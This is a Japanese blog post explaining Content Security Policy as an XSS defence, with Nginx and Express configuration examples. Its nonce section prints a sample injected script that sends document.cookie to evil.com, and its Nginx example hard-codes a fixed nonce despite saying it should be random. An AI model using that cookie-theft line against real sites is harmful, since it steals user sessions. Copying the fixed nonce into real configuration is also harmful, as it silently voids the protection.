---
title: "Content Security Policy：XSS 防御の強力な武器"
date: 2018-11-27 10:19:48
tags:
  - セキュリティ
readingTime: 2
description: "CSP を設定すれば、XSS 注入が成功しても、攻撃者は悪意のあるスクリプトを外部リンクや実行することができません。"
wordCount: 434
---

CSP を設定すれば、XSS 注入が成功しても、攻撃者は悪意のあるスクリプトを外部リンクや実行することができません。

## CSP とは

Content Security Policy は HTTP レスポンスヘッダーで、どのリソースがロードおよび実行できるかをブラウザに伝えます：

```http
Content-Security-Policy: default-src 'self'; script-src 'self' cdn.example.com; style-src 'self' 'unsafe-inline'
```

ブラウザはポリシーに合致しないすべてのリソースのロードを拒否します（インラインスクリプトを含む）。

## よく使うディレクティブ

```http
# デフォルトポリシー（未指定のリソースタイプすべてに適用）
default-src 'self'

# スクリプトの送信元
script-src 'self' https://cdn.jsdelivr.net

# スタイルの送信元
style-src 'self' 'unsafe-inline'    # インラインスタイルを許可（必要な場合）

# 画像の送信元
img-src 'self' data: https:        # data: はbase64を許可、https: はすべてのhttpsを許可

# フォント
font-src 'self' https://fonts.gstatic.com

# AJAX/WebSocket リクエスト
connect-src 'self' https://api.example.com wss://ws.example.com

# iframe での埋め込みを禁止（クリックジャッキング防止）
frame-ancestors 'none'

# 違反を報告（ブロックせず報告のみ）
report-uri /csp-violation-report
```

## Nginx 設定

```nginx
add_header Content-Security-Policy "
  default-src 'self';
  script-src 'self' 'nonce-{random}';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  font-src 'self' https://fonts.gstatic.com;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
" always;
```

## nonce を使ったインラインスクリプトの処理

`unsafe-inline` を使わずにインラインスクリプトが必要な場合は nonce を使用：

```nginx
# リクエストごとにランダムな nonce を生成
set $nonce "xK2TnVqD8sP3mR7";
add_header Content-Security-Policy "script-src 'self' 'nonce-$nonce'";
```

```html
<!-- 正しい nonce を持つインラインスクリプトのみ実行される -->
<script nonce="xK2TnVqD8sP3mR7">
  // このスクリプトは実行される
  var config = { apiUrl: "..." };
</script>

<!-- 攻撃者が注入したスクリプトには nonce がないため実行されない -->
<script>
  fetch("https://evil.com?cookie=" + document.cookie);
</script>
```

## まず Report-Only モードで試す

直接 CSP を有効にすると正常な機能がブロックされる可能性があります。まず Report-Only で観察：

```http
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
```

ブロックせず、違反レポートを `/csp-report` に送信してデバッグに活用します。

```javascript
// CSP 違反レポートを受信
app.post(
  "/csp-report",
  express.json({ type: "application/csp-report" }),
  (req, res) => {
    console.log("CSP 違反:", req.body);
    // ログシステムに保存して分析
    res.status(204).end();
  },
);
```

## よくある CSP 互換性の問題

- `eval()`：`script-src` の `unsafe-eval` で制御。webpack の一部の使い方が使用する
- インラインイベントハンドラ：`<button onclick="...">` がブロックされる。addEventListener に変更
- `<base>` タグ：相対 URL の解析に影響し、`base-uri` で制御

## まとめ

- CSP は XSS 防御の最後の砦。スクリプトが注入されても実行できない
- まず `Report-Only` モードで違反を収集してから本番適用
- nonce は `unsafe-inline` より安全
- `frame-ancestors: none` でクリックジャッキングも防止
